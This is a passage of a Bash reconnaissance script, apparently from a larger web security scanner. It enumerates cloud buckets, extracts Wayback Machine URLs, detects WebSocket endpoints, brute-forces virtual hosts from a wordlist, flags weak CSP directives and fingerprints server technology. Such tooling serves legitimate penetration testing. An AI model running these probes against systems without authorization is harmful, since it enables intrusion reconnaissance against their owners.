    GCODE=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/$bucket" --connect-timeout 8 2>/dev/null)
    [ "$GCODE" = "200" -o "$GCODE" = "403" ] && echo "[$GCODE] GCS: storage.googleapis.com/$bucket" >> "$SESSION/advanced/cloud_storage.txt"
done
if [ -s "$SESSION/advanced/cloud_storage.txt" ]; then
    ok "Cloud storage bucket(s) found!"
    ADV_SCORE=$((ADV_SCORE + 15))
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 10))
else
    info "No exposed cloud storage buckets found"
fi

# ─── ADV 15. WAYBACK MACHINE URL EXTRACTION ───
_section "[ADV 15/60] WAYBACK MACHINE HISTORICAL URLS"
run "Fetching historical URLs from archive.org..."
curl -s "https://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=json&collapse=urlkey&limit=500" \
    --connect-timeout 20 > "$SESSION/recon/wayback_raw.json" 2>/dev/null
if [ -s "$SESSION/recon/wayback_raw.json" ] && [ "$(cat "$SESSION/recon/wayback_raw.json" 2>/dev/null | wc -l)" -gt 2 ]; then
    grep -o '"original":"[^"]*"' "$SESSION/recon/wayback_raw.json" 2>/dev/null | \
        sed 's/"original":"//;s/"$//' | sort -u > "$SESSION/recon/wayback_urls.txt"
    WB_CNT=$(wc -l < "$SESSION/recon/wayback_urls.txt" 2>/dev/null | tr -d ' ')
    ok "$WB_CNT historical URLs from Wayback Machine"
    # Extract JS from wayback
    grep '\.js$' "$SESSION/recon/wayback_urls.txt" > "$SESSION/recon/wayback_js.txt" 2>/dev/null
    # Extract API endpoints
    grep -E '/api/|/v[0-9]+/' "$SESSION/recon/wayback_urls.txt" > "$SESSION/recon/wayback_api.txt" 2>/dev/null
else
    info "No Wayback Machine data available"
fi

# ─── ADV 16. WEBSOCKET SECURITY TESTING ───
_section "[ADV 16/60] WEBSOCKET SECURITY TESTING"
run "Scanning for WebSocket endpoints..."
# Look for ws:// or wss:// in source
WS_ENDPOINTS=$(grep -Eoi 'wss?://[^"<>\s]+' "$SESSION/web/index.html" 2>/dev/null | sort -u)
if [ -n "$WS_ENDPOINTS" ]; then
    echo "$WS_ENDPOINTS" > "$SESSION/advanced/websocket_endpoints.txt"
    ok "WebSocket endpoint(s) found in source!"
    # Check for insecure ws:// (unencrypted)
    if echo "$WS_ENDPOINTS" | grep -q '^ws://'; then
        echo "⚠️  Unencrypted ws:// detected" >> "$SESSION/advanced/websocket_issues.txt"
        EXPOSURE_SCORE=$((EXPOSURE_SCORE + 5))
    fi
    ADV_SCORE=$((ADV_SCORE + 10))
else
    info "No WebSocket endpoints detected"
fi

# ─── ADV 17. VIRTUAL HOST DISCOVERY ───
_section "[ADV 17/60] VIRTUAL HOST BRUTEFORCE"
run "Testing for virtual hosts..."
VHOST_WORDS=("admin" "api" "app" "blog" "cdn" "dev" "ftp" "git" "internal" "jenkins" "jira" \
             "lab" "mail" "mgmt" "panel" "portal" "staging" "test" "uat" "vpn" "web" "www")
> "$SESSION/network/vhosts_found.txt"
for word in "${VHOST_WORDS[@]}"; do
    VRESP=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $word.$TARGET" \
            "https://$TARGET" --resolve "$word.$TARGET:443:$IP" --connect-timeout 8 2>/dev/null)
    if [ "$VRESP" = "200" -o "$VRESP" = "301" -o "$VRESP" = "302" ]; then
        echo "[$VRESP] $word.$TARGET" >> "$SESSION/network/vhosts_found.txt"
    fi
done
if [ -s "$SESSION/network/vhosts_found.txt" ]; then
    ok "Virtual host(s) discovered!"
    ADV_SCORE=$((ADV_SCORE + 10))
else
    info "No additional vhosts found"
fi

# ─── ADV 18. CONTENT SECURITY POLICY (CSP) BYPASS ANALYSIS ───
_section "[ADV 18/60] CSP BYPASS ANALYSIS"
run "Analyzing Content Security Policy..."
CSP_RAW=$(grep -i "content-security-policy" "$SESSION/web/headers_raw.txt" 2>/dev/null | head -1)
if [ -n "$CSP_RAW" ]; then
    echo "$CSP_RAW" > "$SESSION/advanced/csp_raw.txt"
    CSP_ISSUES=0
    # Check for unsafe directives
    echo "$CSP_RAW" | grep -qi "unsafe-inline" && echo "⚠️  unsafe-inline allows XSS" >> "$SESSION/advanced/csp_issues.txt" && CSP_ISSUES=$((CSP_ISSUES + 1))
    echo "$CSP_RAW" | grep -qi "unsafe-eval" && echo "⚠️  unsafe-eval allows code execution" >> "$SESSION/advanced/csp_issues.txt" && CSP_ISSUES=$((CSP_ISSUES + 1))
    echo "$CSP_RAW" | grep -qi "\*" && echo "⚠️  Wildcard (*) in CSP" >> "$SESSION/advanced/csp_issues.txt" && CSP_ISSUES=$((CSP_ISSUES + 1))
    echo "$CSP_RAW" | grep -qi "data:" && echo "⚠️  data: scheme allowed" >> "$SESSION/advanced/csp_issues.txt" && CSP_ISSUES=$((CSP_ISSUES + 1))
    if [ $CSP_ISSUES -gt 0 ]; then
        info "$CSP_ISSUES CSP weakness(es) found"
        ADV_SCORE=$((ADV_SCORE + 5))
    else
        ok "CSP appears strict"
    fi
else
    info "No CSP header found"
    EXPOSURE_SCORE=$((EXPOSURE_SCORE + 5))
fi

# ─── ADV 19. TECHNOLOGY VERSION FINGERPRINTING ───
_section "[ADV 19/60] TECHNOLOGY FINGERPRINTING"
run "Identifying technology stack..."
> "$SESSION/advanced/tech_stack.txt"
# From headers
SERVER_HDR=$(grep -i "^server:" "$SESSION/web/headers_raw.txt" 2>/dev/null | head -1)
X_POWERED=$(grep -i "^x-powered-by:" "$SESSION/web/headers_raw.txt" 2>/dev/null | head -1)
X_ASPNET=$(grep -i "x-aspnet-version" "$SESSION/web/headers_raw.txt" 2>/dev/null)
X_GENERATOR=$(grep -i "x-generator" "$SESSION/web/headers_raw.txt" 2>/dev/null)
[ -n "$SERVER_HDR" ] && echo "$SERVER_HDR" >> "$SESSION/advanced/tech_stack.txt"
[ -n "$X_POWERED" ] && echo "$X_POWERED" >> "$SESSION/advanced/tech_stack.txt"
[ -n "$X_ASPNET" ] && echo "$X_ASPNET" >> "$SESSION/advanced/tech_stack.txt"
[ -n "$X_GENERATOR" ] && echo "$X_GENERATOR" >> "$SESSION/advanced/tech_stack.txt"
# From body
grep -iE 'wp-content|wordpress|drupal|joomla|laravel|django|rails|express|react|angular|vue|next\.js|nuxt' \
    "$SESSION/web/index.html" 2>/dev/null | head -5 >> "$SESSION/advanced/tech_stack.txt"
grep -iE 'jquery-[0-9.]+|bootstrap/[0-9.]+|font-awesome/[0-9.]+' \
    "$SESSION/web/index.html" 2>/dev/null | head -5 >> "$SESSION/advanced/tech_stack.txt"
